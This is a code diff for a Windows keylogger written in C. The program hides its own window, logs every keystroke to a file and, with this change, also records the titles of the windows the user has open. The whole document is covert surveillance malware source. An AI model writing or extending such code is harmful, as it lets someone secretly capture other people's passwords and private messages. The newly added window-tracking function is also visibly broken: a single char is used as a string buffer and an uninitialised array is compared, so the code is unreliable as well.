@@ -1,14 +1,17 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <windows.h>
 
 // FUNCTION DECLARATIONS //
 void HideWindow();
+void GetCurrentApplication(FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
     HideWindow();
+
     while(1){
         
         Sleep(10); // reduce CPU usage
@@ -41,6 +44,19 @@ void HideWindow(){
     ShowWindow(stealth, 0); // set to 0 to not display
 }
 
+// finds the name of the current top-most window/application
+void GetCurrentApplication(FILE* logfile){
+    HWND foreground = GetForegroundWindow();
+    if (foreground){
+        char curr_window, prev_window[256]; //MUST CHANGE so previous is not redeclared
+        GetWindowText(foreground, curr_window, 256);
+        if(strcmp(curr_window, prev_window) != 0){
+            fputs(curr_window, logfile);
+            strncpy(prev_window, curr_window, strlen(curr_window));
+        }
+    }
+}
+
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
     // upper case alphabet
@@ -61,6 +77,7 @@ void KeystrokeHandler(short key, FILE* logfile){
             case VK_SHIFT: fputs("[SHIFT]", logfile); break;
             case VK_CONTROL: fputs("[CTRL]", logfile); break;
             case VK_MENU: fputs("[ALT]", logfile); break;
+            case VK_DELETE: fputs("[DEL]", logfile); break;
             case VK_ESCAPE: fputs("[ESC]", logfile); break;
             case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
             case VK_OEM_1: fputs("[;:]", logfile); break;
